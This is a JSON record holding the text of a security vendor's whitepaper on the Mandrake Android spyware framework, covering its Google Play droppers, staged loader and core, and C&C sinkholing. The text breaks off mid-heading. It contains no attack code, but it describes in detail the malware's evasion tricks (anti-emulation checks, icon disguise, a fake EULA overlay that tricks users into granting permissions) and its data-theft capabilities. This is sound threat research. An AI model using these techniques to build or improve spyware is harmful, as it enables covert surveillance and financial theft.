{
    "id": "21f583d4-d320-432a-9f02-6ef480acebfb",
    "created_at": "2022-10-25T16:48:21.275154Z",
    "updated_at": "2025-03-27T02:16:25.851746Z",
    "deleted_at": null,
    "sha1_hash": "b7a6d4b3ca1bdfba16264880e37137cb4a0bf14e",
    "title": "Macintosh HD:Users:Shared:dd:4work:Bitdefender-PR-Whitepaper-Mandrake-creat4464-en_EN:Bitdefender-PR-Whitepaper-Mandrake-creat4464-en_EN.indd",
    "authors": "",
    "file_creation_date": "2020-05-08T08:44:34Z",
    "file_modification_date": "2020-05-08T08:44:41Z",
    "file_size": 11337015,
    "plain_text": "#### Security\n# Uprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\nwww.bitdefender.com\n\n\n-----\n\n## Contents\n\nForeword...................................................................................................................................................... 3\nTelemetry..................................................................................................................................................... 4\nFlying under the radar................................................................................................................................. 4\nUser manipulation....................................................................................................................................... 5\nPersistence.................................................................................................................................................. 6\nMalware capabilities (Arsenal).................................................................................................................. 6\nCnC infrastructure overview & sinkholing................................................................................................. 7\nMalware anatomy....................................................................................................................................... 7\nGoogle Play droppers................................................................................................................................. 8\nSecond stage loader................................................................................................................................. 14\nFinal stage Core........................................................................................................................................ 15\n\nTechnical details....................................................................................................................................................15\nTaxonomy (Versioning)..................................................................................................................................................15\n\nInteraction between components...............................................................................................................................15\n\nAnti-emulation.................................................................................................................................................................16\n\nAnatomy of a toxic plant.......................................................................................................................... 17\n\nDroppers.................................................................................................................................................................17\nHiding presence...............................................................................................................................................................18\n\nDarkmatter droppers......................................................................................................................................................19\n\nRicinus droppers............................................................................................................................................................ 20\n\nLoader.....................................................................................................................................................................22\nCore.........................................................................................................................................................................23\nUser manipulation - CAD payloads.......................................................................................................................25\nChecking and requesting permissions.......................................................................................................................25\n\nAccessibility service permission..................................................................................................................................25\n\nIgnoring battery optimization.......................................................................................................................................26\n\nDefault SMS application................................................................................................................................................27\n\nCAD blindfolded commands .......................................................................................................................................28\n\nLosing total control (VNC functionality)...............................................................................................................29\nPhishing at its best – credential theft and more.................................................................................................30\nPersistence mechanism........................................................................................................................................32\nNo trace left behind – seppuku.............................................................................................................................33\nTargeted applications............................................................................................................................................34\nMandrake evolution timeline.................................................................................................................... 36\n\nCertificates mapping.............................................................................................................................................38\nFirebase..................................................................................................................................................................38\nA fleeting (toxic) flower.........................................................................................................................................38\nCnC Infrastructure..................................................................................................................................... 39\n\nCnC communication..............................................................................................................................................39\nCommunication protocol: TCP/IP layer......................................................................................................................39\n\nCommunication protocol: TLS/encryption layer...................................................................................................... 40\n\nCommunication protocol: application data..........................................................................................................40\nLeaked commands, phishing attempts................................................................................................................42\nCnC sinkholing.......................................................................................................................................... 43\n\nPivoting the Threat Infrastructure.........................................................................................................................44\nInsights into developers’ accounts.......................................................................................................................48\nAppendix A: MITRE matrix........................................................................................................................ 52\nAppendix B: IOCs...................................................................................................................................... 52\nAppendix C: client commands................................................................................................................. 53\nBibliography............................................................................................................................................... 57\n\n**Authors:**\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\nEven though similar financially motivated Android\nthreats such as Anubis or Ginp were discovered,\nMandrake stood in the shadow for at least 4 years.\nDuring this time, it stole data from at least tens of\nthousands of users.\n\n_“It takes special care not to infect everyone” – This_\nis exactly what the actor did and most likely why it\n\n, ricinusor Nerium. remained under the radar for 4 full years. Because of\n\nthis strategy, the actual number of infections we were\nable to trace is quite low; Google Play Apps used as\ndroppers to infect targets have only hundreds or - in\nsome cases - thousands of downloads. It might even be\npossible that some of the infected users won’t face an\nattack at all if they present no interest to the actor.\n\nIf everything goes wrong, or interest in a victim is lost,\nno worries: Mandrake has a kill-switch – a special\ncommand called _seppuku_ (Japanese form of ritual\nsuicide) that can be issued to wipe all your data and\nleave no trace of malware.\n\nDuring our research, we caught Mandrake red-handed\nwhile conducting phishing attacks for several finance\nand shopping applications, as follows:\n\n               - Investments trading application, CommSec- used for\n_“Trade and manage your investments on the go.” for_\nAustralian companies.\n\n               - Cryptocurrency wallet applications like Lunoor\n_Coinbase - applications with millions of downloads._\n\n               - _Amazon shopping application is also on the target_\nlist, and even Gmail application or Google Chrome.\n\n               - We saw several Australian, Polish or German\nbanking applications: “ANZ Australia”,\n_“Commonwealth Bank of Australia”, “Bank of_\nMelbourne Mobile Banking”, “PLUS BANK S.A.” and\n_“mBank” from Poland or “DeutscheKreditbank AG”_\nfrom Germany.\n\n               - Phishing attack attempts for “BMO, Bank of\n\n. This threat can _Montreal” were also observed, asking for_\n\ncredentials and credit card information.\n\n               - Going even further, also “AustralianSuper” - “the\n_largest Australian superannuation and pension fund”_\nis targeted.\n\n               - Payment applications like PayPal or the “PostePay”\napplication from “Poste Italiane” are not left behind.\n\n               - Phishing attacks on GMail account were also\nobserved on our honeypots.\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\n## Telemetry\n\nWe split the Mandrake campaign into two major infection waves: the first one between 2016 and 2017 with older\nmalware components and reduced functionality set, as well as the current wave between 2018 to 2020. In this white\npaper, we focus mostly on the current wave.\n\n**Figure 1: Infection breakdown by country as shown by our telemetry**\n\nMost victims of the Mandrake stealer are in Australia, Europe, America and Canada. In particular, Australia seems to be\nhighly targeted.\n\nOur sinkholing efforts revealed about 1,000 victims during a 3-week period. Since our sinkholed command & control\ncenter is the last one in the row, only victims that could not connect to the first two servers would make it into our\ninfrastructure.\n\nWe estimate the number of victims in the tens of thousands for the current wave, and probably hundreds of thousands\nthroughout the full 4-year period. We can also extrapolate that every victim of Mandrake has most probably been exposed\nto some form of data theft.\n\n## Flying under the radar\n\nThe Mandrake infrastructure reveals serious efforts at staying in the shadow for 4 years. First, its operators publish\nthe applications on the Google Play marketplace to maintain credibility: we have found 7 such malicious applications\non Google Play: Abfix, CoinCast, SnapTune Vid, Currency XE Converter, Office Scanner, Horoskope and Car News, each\nwith hundreds or thousands of downloads.\n\nAll are standalone applications. They are simple but fully functional and cover different categories: Finance, Auto &\nVehicles, Video Players & Editors, Art & Design and Productivity. Some target specific countries, such as Germany for\nexample.\n\nUnlike other malware spotted on the Google Play Store over the years, Mandrake operators pay attention to negative\nreviews and often deliver fixes for issues reported by users. Besides the responses and quick fixes, the droppers are\nalso mostly ad free. They have even invested in publicity and internet footprint. Some of the malicious samples even\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\nhave a dedicated microsite, a Facebook page, social media accounts like Twitter, Telegram or Reddit and even YouTube\nchannels. All this is done to persuade the user to download and trust the application.\n\nBesides posing as legit applications, the apps use extra techniques to avoid Google Play protection: they delay malicious\nactivity greatly and work in stages. These three stages are dropper, loader and core. These functionalities have different\nroles and complexity. The dropper is considered the app that the victim installs from Google Play. One cannot predict\nwhen they will get the loader and the core components, which will be downloaded by the dropper at some point, when the\nattacker issues the command (or possibly never).\n\nThe malware will also stop working if certain conditions are met: it avoids running in low income states, African nations,\nformer Soviet Union countries or predominantly Arabic-speaking nations. Overall, Mandrake exempts about 90 countries\nfrom infection.\n\nIt also avoids running on devices with no SIM cards or with SIMs issued by specific operators. Most notably, it will not run\nwith Verizon or China Mobile Communications Corporation (CMCC) operators, among others.\n\nCommand and control servers also imply protection mechanisms, rejecting connections from different IP ranges or\nknown cloud IPs.\n\nAdditionally, the apps feature different anti-emulation or hiding techniques: captcha verifications on launch that, if\nnot passed, prevent the entire application from running. This check ensures that the application is not running in an\nautomated simulated environment typical of research labs. Droppers can also hide their icons on older Android versions.\nOn newer versions, where hiding the icon is no longer possible, the apps would change the icon of said application with\none mimicking Storage Settings.\n\n## User manipulation\n\nOne of the most intriguing parts of the malware is the way carefully drawn views, layouts, displays and visual\ncomponents distort the application flow to trick the user into granting dangerous permissions to the app. The method\nworks by modifying regions of the screen to change what the user sees, thus tricking them into enabling additional\npermissions when they tap particular areas\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\nCustom designed views of a fake EULA will be displayed. When users attempt to continue reading or exit, they will be\npressing an accept dialog button in the background instead that grants Mandrake whatever privileges it requires.\n\nMandrake also pays attention to details, and it can handle special circumstances. Such special circumstances are\nsituations where the victim’s phone language is set to French or Spanish, the device is a tablet, the device runs variations\nof Android versions, or the mobile phone manufacturer is Samsung. If such circumstances are met, the malware decides\nwhere to draw the view in order not to look off and arouse user suspicion.\n\n## Persistence\n\nMandrake leverages key privileges offered by the Android OS to maintain a foothold on the device. By using the device\nadministrator privilege, it ensures that it cannot be uninstalled until this privilege is removed. The Accessibility service\nallows it to prevent the victim from removing either device admin or Accessibility privilege.\n\nThis leaves the victim with only one viable way to remove the threat, although it’s extremely complicated for the Average\nJoe: boot the device in safe mode, remove device administrator privilege and uninstall it manually.\n\n## Malware capabilities (Arsenal)\n\nMandrake can execute a wide range of malicious actions. All these commands can be composed to obtain a complex\nattack.\n\nThis is a non-exhaustive list of the most important commands grouped by functionality:\n\n- Message (SMS) manipulation\n\n  - Collect and send all SMS messages to server\n\n  - Forward incoming message to a specified number\n\n  - Hide incoming messages\n\n  - Send a new SMS to a number with content prepared by the attacker\n\n- Calls and contacts\n\n  - Send incoming calls to the server\n\n  - Lower the volume and block incoming calls\n\n  - Initiate a call to a phone number\n\n  - Collect and send the contact list to the attacker\n\n- Application manipulation\n\n  - Collect and exfiltrate installed application names\n\n  - Install other components or possible malicious applications\n\n  - Uninstall applications\n\n- Device and accounts\n\n  - Send all notifications\n\n  - Hide notifications from the user\n\n  - Collect and send all registered account names on the mobile phone\n\n  - Collect device status (Android version, battery level, device model, country, SIM operator, etc.)\n\n- Espionage techniques\n\n  - GPS tracking\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\nand JavaScript injection\n\n  - Screen recording and complete control of the device\n\n- Wipe and vanish\n\n  - Initiate factory reset, will erase all user data as well as any trace of malware\n## CnC infrastructure overview & sinkholing\n\nDuring its 4-year operating window, Mandrake used fixed domain names, as well as a domain generation algorithm\n(DGA). We haven’t seen any DGA domain registered, and, in our opinion, the actors didn’t really need one. Some of the\ndomains or IPs used were associated with past malicious activity.\n\nA very interesting fact here is that the actors forgot to register one domain hardcoded in the list, namely the top level\ndomain for Iran. (.ir)\n\nWe used this opportunity to register it and see a more accurate telemetry. While these actors use some sort of certificate\npining, they were sloppy enough to leave the private key inside the malware apk, and therefore we could install a “legit”\ncommand and control server.\n\nWhile observing their infrastructure, we identified a bug that gave us some insights behind the curtain: opening\na connection and sending incorrect data would return a standard response appended with some random data from\nmemory. This made us think that they use a custom server (probably written in C/C++ language) and they forgot to zero\nthe buffer after allocation. The astonishing fact here was that the bytes contained commands sent to other victims.\n\nThis way, we were able to map how they interact with victims, how they spy on them, and what bank applications they\nintend to attack.\n\nYou can find a more detailed analysis of CnC infrastructure and protocol in the Technical analysis chapter.\n\n## Malware anatomy\n\nTo establish a foothold on the victim’s phone and avoid detection, Mandrake has divided its functionality into 3\ncomponents, each with a different role and complexity.\n\n- Dropper\n\n  - Clean applications found on Google Play\n\n  - Downloads and installs the Loader\n\n- Loader\n\n  - Malicious component with exfiltration capabilities that attempts to hide itself. A stripped version of the core.\n\n  - Will download the core component and load it dynamically\n\n- Core\n\n  - Main component of the malware.\n\n  - Contains advanced exfiltration capabilities and persistence mechanisms.\n\nAll malicious code, regardless of what type of component it is, came from the same code base. We can consider the core\nas having all functionality and each of the other as being stripped versions of it.\n\nAll components communicate with the CnC via a custom native library and components can also communicate with one\nanother.\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\n## Google Play droppers\n\nDroppers are applications designed to look as clean as possible. As components, they were introduced last in the\ndevelopment pipeline. All dropper components were at some point hosted on Google Play. All of them are standalone\napplications, fully functional and catering to a wide range of application groups: Finance, Auto & Vehicles, Video\nPlayers & Editors, Art & Design and Productivity.\n\n**Package name** **Application Name** **Developer**\n\n\nqr.office.scanner Office Scanner ArmDev.\n\ncom.sigmatech.darkmatter Abfix SigmaTech\n\norg.currency.xeconverter Currency XE Converter Christopher Bankson\n\ncom.coincast.app CoinCast CoinCast©\n\nsnap.tunemedia.maker SnapTune Vid FontS\n\ncom.astro.zodiac Horoskope SigmaTech\n\ncom.dark.chameleon Car News SigmaTech\n\n\nMalware authors have always attempted to circumvent Google Play security and gain presence on the market. In turn,\nthis gives them the perfect distribution platform. Once they have managed to publish a malicious app, they often relied\non fake comments and downloads to shoot their application to the trending section of Play.\n\nHere we see something different; malware developers use real marketing and pay attention to negative reviews and\ndeliver fixes for the specified problems of the users.\n\nBesides the responses and quick fixes, the droppers are also mostly ad free. All this is done to persuade the user to\ndownload and keep the applications. They even invested resources in publicity and internet footprint.\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\n[Office Scanner has a Facebook page at https://www.facebook.com/officescanner/. The address on the Facebook page](https://www.facebook.com/officescanner/)\nbelongs to the Engineering and Mathematical Sciences Building, Milwaukee, Wisconsin while the number indicates a landline in\n[Monroe, New York. It also has a YouTube channel at https://www.youtube.com/channel/UCSAHa1M2q6T3KGenRB2ZpFA](https://www.youtube.com/channel/UCSAHa1M2q6T3KGenRB2ZpFA)\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\nThe CoinCast application has seen a lot of development and resources. It has the following assets associated with it:\n\n- [Website: https://coincast.dev/](https://coincast.dev/)\n\n- [Facebook: https://www.facebook.com/CoinCastDev/ (only developer and site listed on About)](https://www.facebook.com/CoinCastDev/)\n\n- [Twitter: https://twitter.com/coincast1](https://twitter.com/coincast1)\n\n- [Reddit: https://www.reddit.com/user/coincast2019/](https://www.reddit.com/user/coincast2019/)\n\n- [Telegram: https://t.me/coincastapp](https://t.me/coincastapp)\n\n- [YouTube: https://www.youtube.com/channel/UCHqDdcYt3nHVShAcwG7SWog with a well-made video](https://www.youtube.com/channel/UCHqDdcYt3nHVShAcwG7SWog)\n\n[And is advertised by the developers: https://bitcointalk.org/index.php?action=profile;threads;u=2567840;sa=showPosts](https://bitcointalk.org/index.php?action=profile;threads;u=2567840;sa=showPosts)\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\n[Both Currency XE Converter and SnapTune Vid applications have only a Facebook page each. https://www.facebook.](https://www.facebook.com/Currency-XE-Converter-107483750751852/)\n[com/Currency-XE-Converter-107483750751852/](https://www.facebook.com/Currency-XE-Converter-107483750751852/)\n\nOnly the developer is indicated.\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\n[https://www.facebook.com/SnapTune-Vid-104011677644335/](https://www.facebook.com/SnapTune-Vid-104011677644335/)\n\nNo contact info.\n\nWhat is odd, though, is that the developers chose to popularize some droppers while practically ignoring others. As far as\nwe are aware, Horoskope, Car News and Abfixdid got no affiliated advertising. Another difference is that the Horoskope\napplication targets German speakers.\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\nDropper applications come with a standard Privacy Policy; these policies have to be hosted somewhere online. The\nSigmaTech developer has a blog entry for each application Privacy Policy at http[:]//abfix-app[.]blogspot.com/ . This blog\nis written in both Russian and in English.\n\nAs our research shows, the Abfix application from SigmaTech was the first malware component published to Google\nPlay.\n\nWith newer versions, developers chose to have a different platform or blogger account for each Privacy Policy, probably\nto avoid connections being made. Even with this level of paranoia, mistakes were made. The Horoskope application from\ndeveloper SigmaTech is digitally signed using the same certificate as the CoinCast application, which actually belongs to\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\n**Simple diagram showing connections between droppers**\n\n## Second stage loader\n\nAs a role, the loader component has always existed in the Mandrake lifecycle, although they introduced the loader\nnaming convention only after a few years of operating. This component acts as the base for the core, which it will\ndownload and load. It also acts as a secondary data exfiltration and assessment component.\n\nIt will collect extra information about the user and, if the attacker chooses, will download and load the core component.\nFunctionally speaking, the loader has commands that can:\n\n- Determine and manipulate the state of the device to some extent\n\n- Determine if the user is a valid target for them and the right spying techniques\n\n- Download and install the Mandrake core\n\n- Hide presence\n\nThe loader application is named Android system, to further conceal itself.\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\n## Final stage Core\n\nThe core component is the last to be deployed in the chain. With this component, Mandrake can execute a wide\nrange of malicious actions. A complete list of the most important commands are described above in the Malware\n**capabilities (Arsenal) chapter.**\n\nThe following chapters are for the tech-savvy who would like a more in-depth analysis.\n\n### Technical details\n\n##### Taxonomy (Versioning)\nThe initial samples in the 2016 wave were versioned as oxide. As operators moved development to the briar branch in\n2016, a simple schema was introduced that consisted of a version string appended to branch name, egbriar_0_9_8. It was\nfollowed later by the ricinus branch and the current darkmatter branch which also has a version name appended.\n\nAlong with the ricinus branch, the malware creators introduced the component model with three types: dropper, loader\nand core.\n\nExamples\n\n**Version** **Role**\n\n\ndarkmatter_0_3.2.3 dropper\n\nricinus_1_3.1.8 dropper\n\ndarkmatter_1_3.2.2 Loader\n\n\ndarkmatter_0_3.2.0 Core\n\nThroughout this paper, we will mostly focus on the new darkmatter versions.\n\n##### Interaction between components\nEach Mandrake component communicates individually with the CnC and can receive commands in this manner. The\nauthors have also implemented an inter-component communication mechanism.\n\nCommunication takes place using Android intents, where each Mandrake component registers for specific custom\nevents that the other components send, thus creating a communication channel.\n\nAll intents are created using a peculiar naming schema, each being named as a variation of **PHOENIX. Each intent**\npasses an “action” message which the receiver retrieves the content from and acts according to its logic.\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\n**The image indicates component – PHOENIX logic mapping**\n\nFunctionally speaking, the dropper only synchronizes with the other components (loader, core) via the PHOENIX_DROP. It\ndoes this when these components issue the synchronization command.\n\nThe loader (which internally Mandrake authors also refer to as parent) receives commands from the core via PHOENIX_\n_PARENT. Older versions received commands such as initiate an update or set firebase token. Newer versions of the loader_\ncomponent, while still receiving the intent, do not implement any commands.\n\nThe loader passes events, such as if an application has been installed, to the core component via PHOENIX_CORE. This\nremains in all versions, even newer.\n\nThe core component can wake the other components via PHOENIX intent (loader, dropper) and send specific commands\nto loader via PHOENIX_PARENT.\n\n##### Anti-emulation\nThe malware implements anti-emulation techniques and validations to make sure it fails in specific countries or on\nphones with specific SIM operators.\n\nDepending on the branch, some checks were different, others suffered minor alterations or improvements. We have\ndivided the checks into the following groups:\n\n**Classical checks**\n\nIncludes verifications if device proprieties, such as brand, model and hardware, are one of several known values indicating\nit’s running in an emulator. There are also checks for indicators of running in a VirtualBox device or in Genymotion (a\nCloud-based Android emulator).\n\n**SIM operator and country checks**\n\nThis check is the most interesting as, besides a few extra searches for other models, SIM operators and brands indicating\nan emulator, there are checks for specific SIM operators and SIM country ISO, that, if found to be true, will prevent the sample\n**_from functioning. Of course, if no SIM is present, the malware assumes it is being emulated._**\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\n**Checked Operator Name** **Corresponding company** **Areas serviced**\n\n\n“WIN” Unknown, a possible variation search for “Wind” (detailed below)\n\n“CMCC” China Mobile Communications China, Hong Kong (as CMHK), Pakistan\nCorporation (CMCC) (as Zong), United Kingdom (as CMLink)\n\n“Verizon” Verizon Communications Inc Worldwide but mainly in United States\n\n\n“Wind” Former Wind Telecomunicazioni (Wind\nItaly), currently named Wind Tre, a\nleading mobile carrier in Italy.\n\n“CJSC” Unknown which one of:\n\n                 - Alpha Telecom CJSC (KZ)\n\n                 - Sharq Telekom CJSC (UZ)\n\n                 - CJSC INDIGO TAJIKISTAN (TJ)\n\n                 - National Telecom, CJSC (RU)\n\n“Blu” Former Blu Italy, a mobile carrier that\nwas disbanded in 2002 and its assets\nwere distributed among Telecom Italia\nMobile, Omnitel Vodafone, Wind and\nH3G [44]\n\n\nItaly, Cambodia, Algeria, Bangladesh,\nPakistan, Burundi, Zimbabwe, Central\nAfrican Republic, Egypt, North Korea,\nNamibia, Greece\n\nKazakhstan\n\nUzbekistan\n\nTajikistan\n\nRussia\n\nItaly, Cambodia, Algeria, Bangladesh,\nPakistan, Burundi, Zimbabwe, Central\nAfrican Republic, Egypt, North Korea,\nNamibia, Greece\n\n\n\n- The corresponding company to checked operator names mapping is a calculated guess, the values for these networks\nare not publicly available.\n\nIf the above checks are passed, a SIM country ISO check is executed.\n\nSeveral groups of countries are avoided. Interestingly, the threat actors often chose to add or remove **_Russia and_**\n**_Kazakhstan in different versions while consistently avoiding running in low-income states, African nations, former Soviet_**\nUnion countries or predominantly Arabic-speaking nations.\n\nInitial versions of Mandrake avoided running in a small group of countries that included Ukraine, Belarus, Kyrgyzstan\nand Uzbekistan. Subsequent newer versions avoided running in Asian and African countries. The list contains countries\nfrom the former Soviet Union, India, some Arabic-speaking nations and some African nations. The full list contains 88\n_countries._\n\n## Anatomy of a toxic plant\n\n### Droppers\n\nMandrake dropper components are applications made to look as clean as possible. There are dropper versions\ncorresponding to each development branch, both ricinus and darkmatter.\n\nAll dropper components have, at some point, lived on Google Play. Their main purpose is to download the loader\ncomponent, which is why all received commands work towards that end.\n\nWe group the commands as indicated by role\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\n  - Wake the phone up and enable Wi-Fi\n\n  - Disable Wi-Fi\n\n  - Collect device status (Android version, battery level, device model, country, SIM operator, etc.)\n\n  - Send to home screen\n\n- Determine if user is a valid target\n\n  - Collect device status (Android version, battery level, device model, country, SIM operator, etc.\n\n  - Collect installed applications\n\n- Download and install next Mandrake component\n\n  - Initiate update routine, which consists of a notification that starts downloading the loader when clicked and then\nprompts the user to install it. The content of the notification will be retrieved dynamically, and the icon used will\nbe that of the Google Play Icon.\n\n  - When an application is installed, it will automatically be opened. This is needed for when it downloads the loader\nand the user unwittingly installs it.\n\n- Hide presence\n\n  - Removes notification for application installation if they came from itself.\n\n  - Swaps default icon for reserved icon\n\n  - Completely hide all icons when the host OS is an older version of Android.\n\nThe state of the mobile phone (battery, Wi-Fi) influences device health, while the list of installed applications provides\ninformation that is most likely used to determine if the victim is of interest. Opening each installed application will further\nexecution flow to the loader, if ever installed. Cancelling own notifications and changing or hiding icon are used for\nstealth purpose.\n\n##### Hiding presence\nRemoving traces of itself from any device is crucial for Mandrake, as every component tries to operate as covert as\npossible.\n\nAll components remove their notifications when possible and, when not, they use transparent notification icons, text that\nimitates system notifications and such.\n\nWhen initiating the download of the loader component, the dropper will use the Google Play icon (as shown in the image).\n\nThe loader component is called Android system. After clicking the fake Google Play update required message, the user\nwill be prompted to install Android system, which in fact, is the loader.\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\nFor an application to have a running service in the background, Android OS mandates that the application displays a\npermanent notification. For these cases Mandrake uses the transparent icons both for the dropper and for the loader.\n\nHighlighted in red is the notification icons used for the dropper and loader\n\nThe full notification text is also presented showing a generic _Syncronization..._ message (from the dropper) and the\n_Android system from the loader._\n\nIn later versions, droppers come with the possibility of hiding their icon. The final method the malicious\nauthors use to cover their tracks, in some cases, is that **_the dropper changes its icon, launcher name and_**\n**_behavior to that of the Settings application, particularly the storage menu view. It does this because,_**\nstarting with Android 10, an application cannot hide its icon under normal conditions anymore.\nAny subsequent tap on the supposed Storage icon would send them to the settings menu. This behavior is rare but not\nunique; malware developers are always adapting to changes to the ecosystem.\n\n##### Darkmatter droppers\nFrom a technical perspective, Darkmatter droppers are applications with standalone functionality that provide the\nfeatures they advertise (e.g. the Currency convertor is actually a currency convertor). While their design is somewhat\ninspired from other existing applications (qr.office.scanner for example slightly mimics com.cv.docscanner), they are\ncustom-developed and maintained by the malicious authors.\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\nAlthough they have the same malicious code base and functionality, the icon hiding (or changing) stealth mechanism is\nnot called by the CnC (at least not in our experiments and monitoring). This is an important change in behavior.\n\n##### Ricinus droppers\nRicinus droppers are quite different from darkmatter droppers. Unlike the darkmatter branch droppers, there is no clean/\nuseful functionality. Here we see a different approach.\n\nThe malware authors, besides classical emulator checks, choose to be even more paranoid and adopt an extra user\nverification mechanism using a captcha. The captcha page starts by showing a progress bar and a simple challenge\nthat consists of generating four random numbers and choosing one as a pass-ticket. This takes place with a delay of 5\nseconds.\n\nIf the user fails to complete this simple captcha by clicking the wrong button 5 times in a row, it will be marked as robot\nand the app will become useless.\n\nIf the user successfully completed this challenge the app will load another page indicated by CnC in a Webview While\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\nthe page loads, the user is presented a custom alert dialog. When pressed, it will open a Google Play listing of a clean\napplication.\n\nThe idea we see in the ricinus droppers is that the malware authors wished to impersonate an already-existing clean\napplication, while darkmatter droppers offer the functionality they indicate as normal applications. The code base for\nRicinus droppers is practically identical, with only minor content variations.\n\nBelow is the text used by Mandrake to prompt the victim to install the “premium” application. This is in fact the clean, real\napp and has nothing to do with the malware in case.\n\n**Alert title** **Horoscope**\n\nAlert message Do you want to launch a premium version of the application?\n\nConfirmation button text yes\n\nDisagreement button text no\n\nLoaded URL [https://www.horoscope.com/us/index.aspx](https://www.horoscope.com/us/index.aspx)\n\nOpened Google Play default link [https://play.google.com/store/apps/details?id=app.horoscope1_5.com](https://play.google.com/store/apps/details?id=app.horoscope1_5.com)\n\nSimilarly, incom.dark.chameleon we have the following:\n\n**Alert title** **Car News**\n\nAlert message Do you want to launch a premium version of the application?\n\nConfirmation button text yes\n\nDisagreement button text no\n\nLoaded URL [http://carbuzz.com/](http://carbuzz.com/)\n\nOpened Google Play default link [https://play.google.com/store/apps/details?id=com.wapit.carbuzz](https://play.google.com/store/apps/details?id=com.wapit.carbuzz)\n\nThe next images show the dialog box, loaded site in the background and redirected to clean application on the right.\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\n**_[Please note that the provided links by the malicious CnC (www.horoscope.com and](https://www.horoscope.com/us/index.aspx)_** **_[http://carbuzz.com/) as well as the](http://carbuzz.com/)_**\n**_application that you are redirected to install from Google Play (app.horoscope1_5.com and com.wapit.carbuzz) are in no way_**\n**_affiliated with this malware. They are simply used (and abused) by the malware authors to look as legitimate as possible._**\n\n### Loader\n\nThe second stage of the attack has the loader component in the spotlight. Similar to droppers, there are ricinus and\ndarkmatter versions. We unfortunately did not obtain a ricinus loader, so our analysis relies on the darkmatter versions.\n\nAfter the loader is downloaded and installed by the dropper, it simply attempts to conceal itself using the same behavior\nas droppers (custom notifications, icon hiding if the Android OS is older than Android 10 or icon changing if not).\n\nTo not raise users’ suspicion by having 2 storage icons (the dropper changes its icon to that of the storage menu) the\nloader will imitate the Wi-Fi icon and, when touched, will of course open the Wi-Fi menu.\n\n**initial loader icon (left) - changed loader icon after execution started (right)**\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\nThis component acts as the base for the core, which it would download and load. It also acts as a secondary data\nexfiltration and secondary assessment component. It would collect extra information about the user and, if the CnC\ndecides it, will download and load the core component.\n\nSimilarly, as with the dropper, we group the commands as indicated by role\n\n- Determine and manipulate the state of the device\n\n- Determine if user is a valid target for them and spying techniques\n\n  - GPS tracking\n\n  - Collect and send all registered account names on the mobile phone\n\n- Download and install the Mandrake core\n\n  - Downloads the core component and loads it dynamically\n\n- Hide presence\n\nFunctionally speaking, the loader adds GPS tracking and registered account theft to the already presented arsenal of\nfeatures in a dropper.\n\nWhen the CnC issues the command, the Mandrake loader downloads the core component, and execution flow continues\nfrom there.\n\n### Core\n\nThe core component has quite a few functionalities. Besides being a vector for constant information exfiltration, it can\nreceive specific commands from the server, as well as from the other components. We grouped the core component\ncapabilities as follows:\n\nHigh-level command routines composed of several different smaller commands and actions with the purpose of\nextending malware capabilities. Most of them take place in the access phase of the CAD functionality.\n\n- Grant itself specific permissions\n\n- Grant itself device administrator privilege\n\n- Grant itself permission to draw overlay\n\n- Grant itself permission to read notification\n\n- Grant itself permission to collect all application usage statistics\n\n- Grant itself privilege to ignore battery optimization\n\n- Set itself as the default SMS application. In some cases, this is executed only if the screen is on\n\n- Disable Google Play Protect\n\n- Allow itself to install from unknown sources\n\nHigh-level command routines commands grouped by functionality:\n\n- Messages (SMS) manipulation\n\n  - Collect and send all SMSs to server\n\n  - Forward incoming message to a specified number\n\n  - Hide incoming messages\n\n  - Send a new SMS to a number with content prepared by the attacker\n\n- Calls and contacts\n\n  - Send incoming calls to the server\n\n  - Lower the volume and block incoming calls\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\n  - Initiate a call to a phone number\n\n  - Collect and send the contact list to the attacker\n\n- Applications manipulation\n\n  - Collect and send installed application names\n\n  - Install other components or possible malicious applications\n\n  - Uninstall applications\n\n- Device and accounts\n\n  - Send all notifications\n\n  - Hide notifications from the user\n\n  - Collect and send all registered account names on the mobile phone\n\n  - Collect device status (Android version, battery level, device model, country, SIM operator, etc.)\n\n- Spying techniques\n\n  - GPS tracking\n\n  - Credential stealing of any account (I.e. Facebook, bank accounts), using a combination of social engineering and\nJavaScript injection\n\n  - Screen recording and complete control of the device\n\n  - Wipe and vanish\n\n  - Initiate factory reset, will erase all user data and no malware trace will be left behind\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 